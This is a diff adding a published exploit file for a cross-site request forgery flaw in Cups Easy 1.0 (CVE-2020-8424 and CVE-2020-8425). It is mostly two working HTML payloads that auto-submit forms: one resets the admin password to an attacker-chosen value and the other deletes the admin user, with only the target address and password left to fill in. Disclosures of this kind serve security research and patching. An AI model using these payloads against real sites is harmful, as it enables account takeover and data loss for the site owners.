@@ -1,0 +1,45 @@
+# Title: Cups Easy 1.0 - Cross Site Request Forgery (Password Reset)
+# Date: 2020-01-28
+# Exploit Author: J3rryBl4nks
+# Vendor Homepage: https://sourceforge.net/u/ajayshar76/profile/
+# Software Link: https://sourceforge.net/projects/cupseasy/files/cupseasylive-1.0/
+# Version: 1.0
+# Tested on Windows 10/Kali Rolling
+# CVE: CVE-2020-8424, CVE-2020-8425
+
+# The Cups Easy (Purchase & Inventory) 1.0 web application is vulnerable to Cross Site Request Forgery 
+# that would allow an attacker to change the Admin password and gain unrestricted 
+# access to the site or delete any user.
+
+# Proof of Concept Code for Password Change:
+
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://SITEADDRESS/cupseasylive/passwordmychange.php" method="POST">
+      <input type="hidden" name="username" value="admin" />
+      <input type="hidden" name="password" value="PASSWORDHERE" />
+      <input type="hidden" name="change" value="Change" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+
+# Proof of concept for user delete:
+
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://SITEADDRESS/cupseasylive/userdelete.php" method="POST">
+      <input type="hidden" name="username" value="admin" />
+      <input type="hidden" name="delete" value="Delete" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
